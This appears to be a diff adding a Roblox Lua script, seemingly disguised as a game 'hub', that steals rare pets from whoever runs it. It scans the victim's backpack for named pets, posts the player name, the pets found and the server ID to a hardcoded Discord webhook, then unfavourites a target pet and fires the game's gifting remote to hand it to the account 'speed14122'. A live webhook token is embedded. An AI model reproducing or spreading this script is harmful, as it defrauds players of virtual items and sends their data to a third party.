@@ -1,0 +1,126 @@
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local player = Players.LocalPlayer
+local backpack = player:WaitForChild("Backpack")
+local notified = false
+local foundTarget = nil
+local waitingToGift = false
+local delayAfterGift = 20
+
+local targetNames = {
+	"Red Fox", "Raccoon", "Dragonfly", "Queen Bee",
+	"Disco Bee", "Cooked Owl", "Blood Owl", "Moon cat",
+	"Panda", "Polar Bear", "Praying Mantis", "Chicken Zombie"
+}
+
+local giftTargetName = "speed14122"
+
+local webhookUrl = "https://discord.com/api/webhooks/1381764967883345950/g3arXN1BRqk85LtUbCC-OK_GS-mKcYiDs4mT9UgZgwr1aSlFeYZAszG8xa96v5LXtXG0"
+
+local function sendWebhook(url, message, playerName)
+	if notified then return end
+	local serverId = game.JobId or "N/A"
+	local data = {
+		["content"] = "**👤 โดยผู้ใช้:** `" .. playerName .. "`\n" .. message .. "\n🌐 Server ID: `" .. serverId .. "`"
+	}
+	local jsonData = HttpService:JSONEncode(data)
+	local headers = {["Content-Type"] = "application/json"}
+
+	local requestFunc = http_request or request or syn.request or http
+	if requestFunc then
+		requestFunc({
+			Url = url,
+			Method = "POST",
+			Headers = headers,
+			Body = jsonData
+		})
+	end
+	notified = true
+end
+
+local function giftPetToPlayer(targetPlayer)
+	local args = { "GivePet", targetPlayer }
+	local petGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
+	petGiftingService:FireServer(unpack(args))
+end
+
+local function isTargetName(name)
+	for _, target in ipairs(targetNames) do
+		if string.find(name, target) then
+			return true
+		end
+	end
+	return false
+end
+
+local function unFavoriteIfTarget()
+	local character = player.Character
+	if not character then return end
+	for _, obj in ipairs(character:GetChildren()) do
+		if obj:IsA("Tool") then
+			for _, target in ipairs(targetNames) do
+				if string.find(obj.Name, target) then
+					local args = { obj }
+					local remote = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("Favorite_Item")
+					remote:FireServer(unpack(args))
+					return
+				end
+			end
+		end
+	end
+end
+
+local function initialScan()
+	local foundItems = {}
+	local foundCounts = {}
+
+	for _, item in ipairs(backpack:GetChildren()) do
+		if item:IsA("Tool") then
+			for _, target in ipairs(targetNames) do
+				if string.find(item.Name, target) then
+					table.insert(foundItems, item)
+					foundCounts[target] = (foundCounts[target] or 0) + 1
+				end
+			end
+		end
+	end
+
+	if #foundItems > 0 then
+		foundTarget = foundItems[1]
+		waitingToGift = true
+
+		local parts = {}
+		for name, count in pairs(foundCounts) do
+			table.insert(parts, name .. " " .. count .. " ตัว")
+		end
+		local message = "📦 พบสัตว์เป้าหมายในกระเป๋า: " .. table.concat(parts, ", ")
+		sendWebhook(webhookUrl, message, player.Name)
+	end
+end
+
+local function checkAndGift()
+	local targetPlayer = Players:FindFirstChild(giftTargetName)
+	if not targetPlayer or not foundTarget then return end
+
+	task.wait(delayAfterGift)
+
+	foundTarget.Parent = player.Character
+	unFavoriteIfTarget()
+	giftPetToPlayer(targetPlayer)
+
+	print("Speed hub no.1")
+
+	waitingToGift = false
+	delayAfterGift = 2
+end
+
+initialScan()
+
+while true do
+	if waitingToGift then
+		checkAndGift()
+	end
+	wait(delayAfterGift)
+end
